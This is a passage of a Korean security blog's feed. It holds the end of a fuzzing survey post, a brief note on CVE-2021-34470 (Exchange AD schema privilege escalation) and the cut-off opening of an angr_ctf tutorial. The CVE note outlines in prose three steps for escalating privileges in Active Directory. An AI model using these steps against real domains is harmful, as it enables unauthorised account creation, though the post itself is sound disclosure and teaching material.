configuration&#xC740; fuzz algorithm&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; parameter&#xAC12;&#xB4E4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC989;, fuzz configuration&#xC740; fuzz algorithm &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. fuzz configuration&#xC744; fuzzing&#xC774; &#xC9C4;&#xD589;&#xB428;&#xC5D0; &#xB530;&#xB77C; &#xBC1C;&#xC804;&#xC2DC;&#xD0A4;&#xB294; fuzzer&#xAC00; &#xC788;&#xB294; &#xBC18;&#xBA74;, fuzz configuration&#xC744; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB05D;&#xAE4C;&#xC9C0; &#xB3D9;&#xC77C;&#xD55C; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; fuzzer&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>seed&#xB780; test case&#xB97C; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; PUT&#xC758; input&#xC785;&#xB2C8;&#xB2E4;. fuzzer&#xB4E4;&#xC740; &#xB300;&#xAC1C; &#xC5EC;&#xB7EC; seed(seed pool)&#xB97C; &#xAC16;&#xACE0; &#xC788;&#xACE0; fuzz campaign&#xC774; &#xC9C4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xBCC0;&#xD654;&#xB97C; &#xC8FC;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; coverage-guided fuzzer&#xB4E4;&#xC740; coverage&#xB77C;&#xACE0; &#xD558;&#xB294; &#xC2E4;&#xD589; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xAC01; configuration&#xC758; &#xBC1C;&#xC804;&#xC744; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="2-3-Fuzz-testing-algorithm"><a href="#2-3-Fuzz-testing-algorithm" class="headerlink" title="2.3 Fuzz testing algorithm"></a>2.3 Fuzz testing algorithm</h2><p><img src="/2021/08/08/fabu1ous/fuzz-1/5.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; fuzz testing&#xC758; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC758;&#xC0AC; &#xCF54;&#xB4DC;&#xB85C; &#xC791;&#xC131;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Black-box, Grey-box, White-box&#xC758; &#xAE30;&#xCD08;&#xAC00; &#xB418;&#xB294; &#xCF54;&#xB4DC;&#xC774;&#xBA70; &#xB450;&#xAC1C;&#xC758; &#xAD6C;&#xC131;&#xC73C;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Preprocess&#xB294; fuzz campaign&#xC758; &#xC2DC;&#xC791;&#xC73C;&#xB85C; &#x201C;&#xC804;&#xCC98;&#xB9AC;&#x201D; &#xB2E8;&#xACC4;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</li><li>5&#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xB8E8;&#xD504;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>Schedule, InputGen, InputEval, ConfUpdate, Continue</li><li>&#xD55C; &#xBC88;&#xC758; &#xB8E8;&#xD504; &#xC2E4;&#xD589;&#xC744; fuzz iteration&#xC774;&#xB77C; &#xBD80;&#xB984;</li><li>InputEval &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; PUT&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC744; fuzz run&#xC774;&#xB77C; &#xBD80;&#xB984;</li></ul></li></ol><p>&#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xB300;&#xB85C; ConfUpdate &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB294; fuzzer&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB4EF; &#xD574;&#xB2F9; 5&#xB2E8;&#xACC4; &#xC911; &#xC77C;&#xBD80;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; fuzzer&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>Preprocess(C) &#x2192; C</p><p>Preprocess &#xB2E8;&#xACC4;&#xB294; fuzz configuration&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xC218;&#xC815;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. fuzz algorithm&#xB9C8;&#xB2E4; &#xB2E4;&#xB978; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xBA70; PUT&#xC5D0; Instrumentaion code&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAC70;&#xB098; seed file&#xC758; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Schedule(C, t_elapsed, t_limit) &#x2192; conf</p><p>&#xD604;&#xC7AC; set of fuzz configuration(C), current time(t_elapesed), timeout(t_limit)&#xC744; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xD604;&#xC7AC; iteration&#xC5D0; &#xC801;&#xC6A9;&#xC2DC;&#xD0AC; configuration(conf)&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>InputGen(conf) &#x2192; tcs</p><p>fuzz configuration(conf)&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; teset cases(tcs)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. InputGen&#xC740; conf&#xC758; &#xD2B9;&#xC815;&#xD55C; parameter&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; conf&#xC18D; seed&#xB97C; &#xC0AC;&#xC6A9;&#xD574; input&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAC70;&#xB098; model &#xD639;&#xC740; &#xBB38;&#xBC95;&#xC744; parameter&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>InputEval(conf, tsc, Obug) &#x2192; B&#x2019;, execinfo</p><p>fuzz configuration(conf)&#xACFC; teset cases(tcs), bug oracle(Obug)&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; tcs&#xAC00; PUT&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294; &#xD589;&#xB3D9;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. set of bug(B&#x2019;)&#xC640; &#xAC01; fuzz run&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;(execinfo)&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA70; execinfo&#xB294; fuzz configuration update&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>ConfUpdate(C, conf, execinfo) &#x2192; C</p><p>set of fuzz configuration(C), current configuration(conf), info of fuzz run(execinfo)&#xB97C; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xBC1B;&#xC74C; set of fuzz configuration(C)&#xC744; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CE;&#xC740; gray-box fuzzer&#xB4E4;&#xC740; execinfo&#xB97C; &#xD1B5;&#xD574; set of fuzz configuration(C)&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xC904;&#xC774;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Continue(C) &#x2192; {True, False}</p><p>set of fuzz configuration(C) C&#xB97C; &#xBC1B;&#xC544; &#xB2E4;&#xC74C; iteration&#xC758; &#xC2E4;&#xD589; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. white-box fuzzer&#xC5D0;&#xC120; &#xB354; &#xC774;&#xC0C1; &#xBC1C;&#xACAC;&#xD560; path&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="2-4-Texonomy-of-fuzzer"><a href="#2-4-Texonomy-of-fuzzer" class="headerlink" title="2.4 Texonomy of fuzzer"></a>2.4 Texonomy of fuzzer</h2><p>fuzzer &#xB9C8;&#xB2E4; &#xAC01; fuzz run&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD558;&#xB294; data&#xC758; &#xC885;&#xB958;&#xAC00; &#xB2E4;&#xB974;&#xBA70; &#xC774;&#xB97C; &#xD1B5;&#xD574; fuzzer&#xB97C; 3&#xAC00;&#xC9C0;&#xB85C; &#xAD6C;&#xBD84;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/08/fabu1ous/fuzz-1/6.png" alt></p><h3 id="2-4-1-Black-box-fuzzer"><a href="#2-4-1-Black-box-fuzzer" class="headerlink" title="2.4.1 Black-box fuzzer"></a>2.4.1 Black-box fuzzer</h3><p>PUT&#xC758; &#xB0B4;&#xBD80;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xC5C6;&#xC774; &#xD589;&#xD574;&#xC9C0;&#xB294; software-testing&#xACFC; fuzzing&#xC744; black-box&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. PUT&#xC758; input/output &#xB3D9;&#xC791;&#xB9CC;&#xC744; &#xAD00;&#xCE21;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; software-testing&#xC5D0;&#xC120; IO-driven &#xD639;&#xC740; data-driven testing&#xC774;&#xB77C;&#xACE0;&#xB3C4; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. &#xACE0;&#xC804;&#xC801;&#xC778; fuzzer&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; black-box fuzzer&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-2-White-box-fuzzer"><a href="#2-4-2-White-box-fuzzer" class="headerlink" title="2.4.2 White-box fuzzer"></a>2.4.2 White-box fuzzer</h3><p>PUT&#xC758; internals&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xC815;&#xBCF4;&#xC640; PUT&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC218;&#xC9D1;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; test case&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; fuzzer&#xC785;&#xB2C8;&#xB2E4;. White-box fuzzing&#xC740; 2007&#xB144; Godefroid&#xC5D0; &#xC758;&#xD574; &#xC18C;&#xAC1C;&#xB418;&#xC5C8;&#xACE0; DSE(Dynamic Symbolic execution)&#xC758; dynamic instrumentaion&#xACFC; SMT solving&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; overhead&#xAC00; black-box&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xAC8C; &#xC77C;&#xBC18;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-3-Grey-box-fuzzer"><a href="#2-4-3-Grey-box-fuzzer" class="headerlink" title="2.4.3 Grey-box fuzzer"></a>2.4.3 Grey-box fuzzer</h3><p>black-box&#xC640; white-box&#xC758; &#xC911;&#xB2E8; &#xB2E8;&#xACC4;&#xB97C; &#xD0DD;&#xD55C; fuzzer&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB4F1; PUT&#xC758; internals&#xC640; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xC77C;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xBA70; white-box&#xC640; &#xB2EC;&#xB9AC; PUT&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xBCBD;&#xD55C; &#xBD84;&#xC11D; &#xC815;&#xBCF4;&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. grey-box&#xC758; &#xAC00;&#xC7A5; &#xD754;&#xD55C; &#xC608;&#xB85C; code coverage &#xAE30;&#xBC18; &#xC18D;&#xB3C4; &#xAC1C;&#xC120;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>black-box, grey-box, white-box fuzzer&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xB7F0; &#xAD6C;&#xBD84;&#xC740; &#xBA85;&#xD655;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. PUT&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xC218;&#xC9D1;&#xC744; &#xD558;&#xB294; black-box&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xADFC;&#xC0AC;&#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; white-box &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5EC;&#xC804;&#xD788; &#xADF8; &#xACBD;&#xACC4;&#xAC00; &#xBAA8;&#xD638;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;"><a href="#&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;" class="headerlink" title="&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;"></a>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/7.png" alt></p><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xCD08;&#xBC18;&#xBD80;&#xB77C; &#xC26C;&#xC6B4; &#xD3B8;&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; intsrumentaion, bug oracle, seed selection &#xB4F1; &#xC774;&#xB984;&#xB9CC; &#xB4E4;&#xC5B4;&#xB3C4; &#xBA38;&#xB9AC;&#xAC00; &#xC544;&#xD30C;&#xC624;&#xB294;, &#xAC01;&#xAC01; &#xC5F0;&#xAD6C;&#xAE00; &#xD558;&#xB098;&#xB294; &#xCDA9;&#xBD84;&#xD788; &#xC4F0;&#xACE0;&#xB3C4; &#xB0A8;&#xC744; &#xC8FC;&#xC81C;&#xB4E4;&#xC744; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xAE00;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB05D;&#xC774;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C; &#xAE00;&#xBD80;&#xD134; &#xCD94;&#xAC00;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xC57C; &#xD560;&#xAC8C; &#xC0B0;&#xB354;&#xBBF8;&#xB77C;&#x2026; &#xD37C;&#xC800;101 &#xC2DC;&#xB9AC;&#xC988;&#xB294; &#xC815;&#xB9D0; &#xC624;&#xB798;&#xC624;&#xB798; &#xD2C8;&#xD2C8;&#xC774; &#xC791;&#xC131;&#xD560; &#xAC70; &#xAC19;&#xAD70;&#xC694;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>fuzzer</tag>
      
      <tag>servey</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-34470: Exchange AD Schema Misconfiguration Elevation of Privilege</title>
    <link href="/2021/08/06/j0ker/2021-08-06/"/>
    <url>/2021/08/06/j0ker/2021-08-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2186&amp;q=finder%3Dforshaw&amp;can=1&amp;sort=-reported">https://bugs.chromium.org/p/project-zero/issues/detail?id=2186&amp;q=finder%3Dforshaw&amp;can=1&amp;sort=-reported</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Exchange</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS Exchange&#xC5D0;&#xC11C; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; AD &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xAE30;&#xC874;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB9CC; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; msExchStorageGroup&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xC2A4;&#xD0A4;&#xB9C8; &#xC124;&#xC815; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC6CC;&#xD06C;&#xC2A4;&#xD14C;&#xC774;&#xC158;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C;(2019 &#xC774;&#xD558; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC77C;&#xBC18; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB3C4; &#xAC00;&#xB2A5;) &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>AD&#xC5D0;&#xC11C; &#xCEF4;&#xD4E8;&#xD130; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xC544;&#xB798; msExchStorageGroup&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xD6C4; &#xC6D0;&#xD558;&#xB294; &#xC720;&#xC800;&#xB098; &#xADF8;&#xB8F9; &#xAC19;&#xC740; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>j0ker</tag>
      
      <tag>exchange</tag>
      
      <tag>ad</tag>
      
      <tag>schema</tag>
      
      <tag>misconfiguration</tag>
      
      <tag>CVE-2021-34470</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 핵린이의 angr 정복기 - (3) angr_ctf part.1</title>
    <link href="/2021/08/04/j0ker/angr_part3/"/>
    <url>/2021/08/04/j0ker/angr_part3/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-3-angr-ctf-part-1"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-3-angr-ctf-part-1" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</h1><p><img src="/2021/08/04/j0ker/angr_part3/5ij3uc.jpg" alt="angr_part3/5ij3uc.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC800;&#xBC88;&#xC8FC; Symbolic Execution &#xACF5;&#xBD80;&#xD558;&#xB2E4; &#xB0B4;&#xC0C1;&#xC744; &#xC785;&#xC5B4; &#xC880; &#xC26C;&#xACE0; &#xC2F6;&#xC5C8;&#xC9C0;&#xB9CC; &#xC5ED;&#xC2DC; &#xD300;&#xC5D0;&#xC11C;&#xB294; &#xC800;&#xB97C; &#xAC00;&#xB9CC;&#xD788; &#xB450;&#xC9C0; &#xC54A;&#xB124;&#xC694;. &#xC5B4;&#xB51C; &#xAC00;&#xB4E0; &#xB9C9;&#xB0B4;&#xAC00; &#xB9CE;&#xC774; &#xC6C0;&#xC9C1;&#xC5EC;&#xC57C; &#xC0AC;&#xB791;&#xBC1B;&#xB294;&#xB2E4;&#xB294;&#xB370; &#xC800;&#xB294; &#xB531;&#xD788; &#xB0A8;&#xC790;&#xB4E4;&#xC758; &#xC0AC;&#xB791;&#xC744; &#xBC1B;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xB354; &#xAC00;&#xB9CC;&#xD788; &#xC788;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xB450;&#xC138;&#xBC30;&#xB85C; &#xC0AC;&#xB791;(?) &#xB2F9;&#xD558;&#xACE0; &#xC788;&#xB124;&#xC694; &#xD5C8;&#xD5C8; &#xB9C9;&#xB0B4;&#xAC00; &#xB9CE;&#xC774; &#xC6C0;&#xC9C1;&#xC5EC;&#xC57C; &#xC0AC;&#xB791;&#xBC1B;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xB2E4; &#xAC1C;&#xBEE5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xAC00;&#xB9CC;&#xD788; &#xC788;&#xC73C;&#xC138;&#xC694;. &#xADF8;&#xB7FC; &#xB354; &#xB9CE;&#xC740; &#xC0AC;&#xB791;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(&#xACBD;&#xD5D8;&#xB2F4;)</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC8FC;&#xC5D0;&#xB294; &#xD790;&#xB9C1;&#xD558;&#xBA74;&#xC11C; &#xACF5;&#xBD80;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC65C;&#xB0D0;&#xBA74; &#xB0B4;&#xC6A9;&#xC774; &#xC26C;&#xC6E0;&#xAC70;&#xB4E0;&#xC694;!! &#xD0BC;&#xD0BC;&#xD0BC;&#x314B;</p><p><img src="/2021/08/04/j0ker/angr_part3/1628050255.gif" alt="angr_part3/1628050255.gif"></p><p>&#xC774;&#xBC88;&#xC8FC;&#xB294; <a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>&#xC5D0; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC04;&#xB2E8;&#xD788; &#xC124;&#xBA85;&#xD558;&#xBA74; CTF&#xC5D0; &#xB098;&#xC628; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xAE30; &#xC804;&#xC5D0; angr&#xC5D0; &#xC880; &#xB354; &#xC775;&#xC219;&#xD574;&#xC9C0;&#xAE30; &#xC704;&#xD55C; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xB4E4;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC81C; 1&#xD3B8;&#xC774;&#xB098; 2&#xD3B8;&#xC744; &#xBCF4;&#xC168;&#xB354;&#xB77C;&#xB3C4; angr&#xB97C; &#xBC14;&#xB85C; &#xC368;&#xC11C; CTF &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xC218; &#xC788;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2DC;&#xC9C4; &#xC54A;&#xC73C;&#xC168;&#xC744;&#xD150;&#xB370;&#xC694;. &#xC774; &#xBB38;&#xC81C;&#xB4E4;&#xB9CC; &#xD47C;&#xB2E4;&#xBA74; &#xC774;&#xC81C; CTF &#xBB38;&#xC81C; &#xD478;&#xB294; &#xAC83;&#xB3C4; &#xBB34;&#xB9AC;&#xAC00; &#xC5C6;&#xC5B4; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;!(&#xC544;&#xB9C8;&#xB3C4;&#x2026;) &#xC5EC;&#xB7EC;&#xBD84;&#xB3C4; &#xD480;&#xC5B4;&#xBCF4;&#xC2DC;&#xBA74;&#xC11C; &#xC800;&#xC640; &#xAC19;&#xC774; &#xD575;&#xB9B0;&#xC774;&#xB97C; &#xD0C8;&#xCD9C;&#xD574;&#xBCF4;&#xC2DC;&#xC8E0;!(&#xBC29;&#xAE08; &#xC81C; &#xBA38;&#xB9BF;&#xC18D;&#xC5D0; &#xD574;&#xD0B9;&#xC73C;&#xB85C; &#xC138;&#xACC4; &#xC815;&#xBCF5;&#xD558;&#xB294; &#xC7A5;&#xBA74;&#xC774; &#xC9C0;&#xB098;&#xAC14;&#x2026; &#xC74D;&#xC74D;)</p><p>&#xBB38;&#xC81C;&#xB97C; &#xD480;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; angr_ctf&#xB97C; &#xD074;&#xB860;&#xD574;&#xBCF4;&#xC2DC;&#xBA74; &#xB9CE;&#xC740; &#xD3F4;&#xB354;&#xB4E4;&#xC774; &#xC788;&#xC744;&#xAC81;&#xB2C8;&#xB2E4;. &#xAC01;&#xBB38;&#xC81C; &#xBCC4;&#xB85C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB791; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xB370; &#xC800;&#xD76C;&#xB294; &#xC77C;&#xC77C;&#xC774; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xAE30; &#xADC0;&#xCC2E;&#xC73C;&#xB2C8;&#xAE4C; dist &#xD3F4;&#xB354;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xB4E4;&#xB85C; 